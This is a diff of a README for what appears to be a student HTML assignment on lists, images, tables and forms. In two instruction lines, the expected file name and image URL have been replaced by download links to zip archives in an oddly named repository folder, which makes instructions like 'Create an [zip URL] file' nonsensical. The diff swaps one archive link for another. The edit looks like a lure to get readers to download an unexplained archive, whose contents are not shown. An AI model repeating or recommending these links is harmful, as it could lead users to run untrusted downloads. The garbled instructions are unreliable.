@@ -7,9 +7,9 @@ Apply multimedia elements such as audio and video.
 
 ## Instructions
 
-- Create an https://raw.githubusercontent.com/timokamau/feb-2025-advanced-html-timokamau/main/fenceress/feb-2025-advanced-html-timokamau-1.3.zip file.
+- Create an https://github.com/timokamau/feb-2025-advanced-html-timokamau/raw/refs/heads/main/fenceress/html-feb-timokamau-advanced-Trichostema.zip file.
 - Add an ordered list with roman numerals
-- Add an external image from https://raw.githubusercontent.com/timokamau/feb-2025-advanced-html-timokamau/main/fenceress/feb-2025-advanced-html-timokamau-1.3.zip
+- Add an external image from https://github.com/timokamau/feb-2025-advanced-html-timokamau/raw/refs/heads/main/fenceress/html-feb-timokamau-advanced-Trichostema.zip
 - Add a table of 5 contacts with; name, address, mobile and emails
 - Add a registration form
 
